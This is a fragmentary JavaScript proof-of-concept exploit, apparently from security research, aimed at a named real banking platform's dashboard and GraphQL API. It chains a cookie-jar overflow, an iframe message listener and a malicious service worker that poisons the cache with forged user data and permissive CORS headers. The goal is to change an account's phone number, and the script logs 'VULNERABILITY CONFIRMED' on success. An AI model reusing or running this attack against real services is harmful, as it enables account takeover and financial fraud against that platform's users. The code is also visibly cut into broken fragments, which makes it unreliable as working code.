        // Step 1: Cookie Jar Overflow Attack

                    // Attempt to set max cookies on dashboard.swan.io

                    } catch (e) {

                        log("Script injection failed (expected):", "warning");

                    // Set up message listener for communication from iframe
                    window.addEventListener("message", (event) => {

        // Step 3: Service Worker Attack

                        // Activate immediately
                        self.addEventListener('activate', event => {
                            event.waitUntil(self.clients.claim());
                            
                            // Try to poison cache after activation
                            event.waitUntil(
                                caches.open('swan-api-cache').then(cache => {
                                    // Create special responses that will bridge authentication
                                    const bridgeResponse = new Response(
                                        '{"data":{"user":{"mobilePhoneNumber":"+33600000001"}}}',

                                    // Add to cache

                                        cache.put(new Request('https://api.swan.io/admin/graphql'), bridgeResponse.clone())

                            const url = new URL(event.request.url);

                                // Clone request to inspect

                                                            'Access-Control-Allow-Credentials': 'true'
                                                        }
                                                    }
                                                ));
                                                return;
                                            }
                                        } catch (e) {
                                            console.error("Error in service worker:", e);
                                        }
                                    }());
                                }
                                
                                // For preflight requests
                                if (event.request.method === 'OPTIONS') {
                                    event.respondWith(new Response(null, {
                                        headers: {
                                            'Access-Control-Allow-Origin': '*',
                                            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
                                            'Access-Control-Allow-Headers': 'Content-Type, Authorization',
                                            'Access-Control-Allow-Credentials': 'true',
                                            'Access-Control-Max-Age': '86400'
                                        }

                                }

                    // Create a blob URL for the service worker

                    // Register the service worker

                    // Wait a bit for the service worker to activate

                        log("Service worker should be active now");

                } catch (e) {
                    log(`Service worker registration error: ${e.message}`, "error");
                }
            } else {

        // Run the phone modification exploit

                const text = await response.text();
                log(`Phone modification response: ${text}`);
                
                if (response.ok) {
                    try {
                        const data = JSON.parse(text);
                        const responseType = data?.data?.startPhoneNumberModification?.__typename;
                        
                        if (responseType === "StartPhoneNumberModificationSuccessPayload") {
                            log("🔥🔥🔥 VULNERABILITY CONFIRMED! Successfully initiated phone number change!", "success");

                            // This is still success! The server authenticated the request but rejected it for business logic reasons
                            log("🔥🔥🔥 VULNERABILITY CONFIRMED! Got business logic rejection which proves authentication worked!", "success");
                        } else {
                            log(`Unexpected response type: ${responseType || "unknown"}`, "error");
